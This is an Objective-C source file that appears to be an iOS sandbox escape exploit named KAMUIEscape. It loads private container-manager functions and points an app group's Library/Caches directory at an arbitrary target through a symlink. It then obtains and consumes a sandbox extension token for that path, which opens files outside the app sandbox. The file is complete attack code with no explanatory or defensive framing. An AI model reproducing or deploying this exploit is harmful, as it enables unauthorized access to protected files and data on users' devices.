#import <Foundation/Foundation.h>
#import <xpc/xpc.h>
#import <dlfcn.h>
#import <sys/stat.h>

@interface KAMUIEscape : NSObject
+ (int64_t)escapeToPath:(NSString *)path;
+ (void)releaseHandle:(int64_t)handle;
@end

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);

static void *g_mgr = NULL;
static container_query_create_fn query_create = NULL;
static container_query_set_class_fn query_set_class = NULL;
static container_query_set_identifiers_fn query_set_group_ids = NULL;
static container_query_set_flags_fn query_set_flags = NULL;
static container_query_set_part_fn query_set_part = NULL;
static container_query_get_single_result_fn query_get_result = NULL;
static container_query_free_fn query_free = NULL;
static container_copy_sandbox_token_fn copy_token = NULL;
static sandbox_extension_consume_fn consume_ext = NULL;
static sandbox_extension_release_fn release_ext = NULL;

static BOOL initManager(void) {
    if (g_mgr) return YES;
    
    g_mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!g_mgr) return NO;
    
    query_create = (container_query_create_fn)dlsym(g_mgr, "container_query_create");
    query_set_class = (container_query_set_class_fn)dlsym(g_mgr, "container_query_set_class");
    query_set_group_ids = (container_query_set_identifiers_fn)dlsym(g_mgr, "container_query_set_group_identifiers");
    query_set_flags = (container_query_set_flags_fn)dlsym(g_mgr, "container_query_operation_set_flags");
    query_set_part = (container_query_set_part_fn)dlsym(g_mgr, "container_query_operation_set_part");
    query_get_result = (container_query_get_single_result_fn)dlsym(g_mgr, "container_query_get_single_result");
    query_free = (container_query_free_fn)dlsym(g_mgr, "container_query_free");
    copy_token = (container_copy_sandbox_token_fn)dlsym(g_mgr, "container_copy_sandbox_token");
    consume_ext = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    release_ext = (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    
    return (query_create && query_set_class && query_set_group_ids && 
            query_set_flags && query_set_part && query_get_result && 
            query_free && copy_token && consume_ext);
}

@implementation KAMUIEscape

+ (int64_t)escapeToPath:(NSString *)target {
    if (!initManager()) return -1;
    
    NSString *appGroup = @"group.com.jasonquiles.F1OOB";
    
    // Strategy 1: Class 13 partDomain traversal
    NSFileManager *fm = [NSFileManager defaultManager];
    NSURL *groupRoot = [fm containerURLForSecurityApplicationGroupIdentifier:appGroup];
    if (!groupRoot) return -2;
    
    NSString *caches = [[groupRoot URLByAppendingPathComponent:@"Library/Caches"] path];
    
    void *query = query_create();
    if (!query) return -3;
    
    query_set_class(query, 13);
    xpc_object_t id_obj = xpc_string_create(appGroup.UTF8String);
    query_set_group_ids(query, id_obj);
    query_set_part(query, 3);
    
    [fm removeItemAtPath:caches error:nil];
    if (![fm createSymbolicLinkAtPath:caches withDestinationPath:target error:nil]) {
        query_free(query);
        return -4;
    }
    
    void *result = query_get_result(query);
    if (!result) {
        query_free(query);
        [fm removeItemAtPath:caches error:nil];
        return -5;
    }
    
    char *token = copy_token(result);
    if (!token) {
        query_free(query);
        [fm removeItemAtPath:caches error:nil];
        return -6;
    }
    
    int64_t handle = consume_ext(token);
    query_free(query);
    free(token);
    [fm removeItemAtPath:caches error:nil];
    
    return handle;
}

+ (void)releaseHandle:(int64_t)handle {
    if (handle >= 0 && release_ext) {
        release_ext(handle);
    }
}

@end
